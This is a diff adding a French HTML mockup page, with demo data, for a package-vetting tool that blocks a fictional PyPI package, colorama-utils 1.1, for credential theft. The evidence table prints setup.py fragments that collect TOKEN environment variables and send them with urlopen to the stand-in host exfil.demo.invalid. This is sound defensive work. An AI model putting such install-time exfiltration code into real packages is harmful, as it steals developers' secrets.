@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>colorama-utils 1.1 — sas-pme</title><link rel="stylesheet" href="maquette.css"></head>
+<body>
+<header><span class="marque">sas-pme</span>
+  <nav><a href="catalogue.html">Catalogue</a><a href="file-attente.html">File d'attente</a><a href="#">Demander un paquet</a><a href="journal.html">Journal</a><a href="comptes.html">Comptes</a></nav>
+  <span class="droite">sam <span class="role">admin</span> <a href="#">Se déconnecter</a></span></header>
+<main>
+<div class="note">Maquette M1 — données fictives. C'est la page clé de la démo (temps 3).</div>
+<h1>colorama-utils <span style="font-weight:400">1.1</span> <span class="etat bloquee">bloquée</span></h1>
+<p class="sous">pypi · publiée sur Internet le 09/10/2026 22:15 · analysée le 12/10/2026 22:16 · version utilisée sur les serveurs : 1.0</p>
+
+<div class="verdict">
+  <strong>Cette version vole les jetons d'accès dès son installation et les envoie à un serveur inconnu.</strong>
+  <p>Le fichier <code>setup.py</code>, modifié depuis la 1.0 alors que le changelog annonce « correction d'une faute de frappe », lit les variables contenant <code>TOKEN</code> et les envoie à <code>exfil.demo.invalid</code>. En sandbox, l'installation a lu le faux jeton <code>GITHUB_TOKEN</code> puis tenté une connexion vers ce domaine, toutes les 60 secondes.</p>
+  <p>Ce comportement correspond à une technique connue de vol d'identifiants par un paquet piégé.
+     Références : <span class="ref">CWE-506</span> <span class="ref">CAPEC-538</span> <span class="ref">ATT&amp;CK T1195.002</span> <span class="ref">MAL-2024-9921</span></p>
+</div>
+<p class="mono">Décision prise par la politique (code). Le LLM a expliqué et cité ; il ne peut ni approuver ni bloquer seul.</p>
+
+<h2>Preuves</h2>
+<table>
+  <thead><tr><th>Source</th><th>Niveau</th><th>Constat</th><th>Preuve</th></tr></thead>
+  <tbody>
+    <tr><td>sandbox</td><td class="niveau n-bloquant">bloquant</td><td>leurre lu puis envoyé</td><td><code>GITHUB_TOKEN</code> lu, puis DNS <code>exfil.demo.invalid</code></td></tr>
+    <tr><td>sandbox</td><td class="niveau n-fort">fort</td><td>connexions régulières (battement)</td><td>6 tentatives vers <code>exfil.demo.invalid:443</code>, toutes les 60 s ± 1 s</td></tr>
+    <tr><td>statique</td><td class="niveau n-fort">fort</td><td>code réseau ajouté au code d'installation</td><td><code>setup.py:42</code><pre>urllib.request.urlopen("https://exfil.demo.invalid/c", data=...)</pre></td></tr>
+    <tr><td>statique</td><td class="niveau n-moyen">moyen</td><td>lecture de secrets ajoutée</td><td><code>setup.py:38</code><pre>{k: v for k, v in os.environ.items() if "TOKEN" in k}</pre></td></tr>
+    <tr><td>llm</td><td class="niveau n-fort">fort</td><td>changelog incohérent avec le code</td><td>« fix typo » mais 14 lignes réseau ajoutées</td></tr>
+    <tr><td>veille</td><td class="niveau n-fort">fort</td><td>article de chercheur</td><td><a href="#">« Malware found in colorama-utils 1.1 »</a> (source libre : à revoir, ne bloque pas seule)</td></tr>
+  </tbody>
+</table>
+
+<h2>Sandbox</h2>
+<table>
+  <tr><th style="width:220px">Requêtes DNS</th><td class="alerte">exfil.demo.invalid (×6)</td></tr>
+  <tr><th>Connexions tentées</th><td class="alerte">exfil.demo.invalid:443 (×6)</td></tr>
+  <tr><th>Fichiers sensibles lus</th><td>aucun</td></tr>
+  <tr><th>Leurres lus</th><td class="alerte">GITHUB_TOKEN</td></tr>
+  <tr><th>Processus</th><td>pip, python</td></tr>
+  <tr><th>Durée</th><td>64,2 s · réseau réel : aucun (conteneur isolé)</td></tr>
+</table>
+
+<div class="actions"><a class="bouton" href="#">Voir le diff 1.0 → 1.1</a><a class="bouton" href="journal.html">Voir dans le journal</a></div>
+</main></body></html>
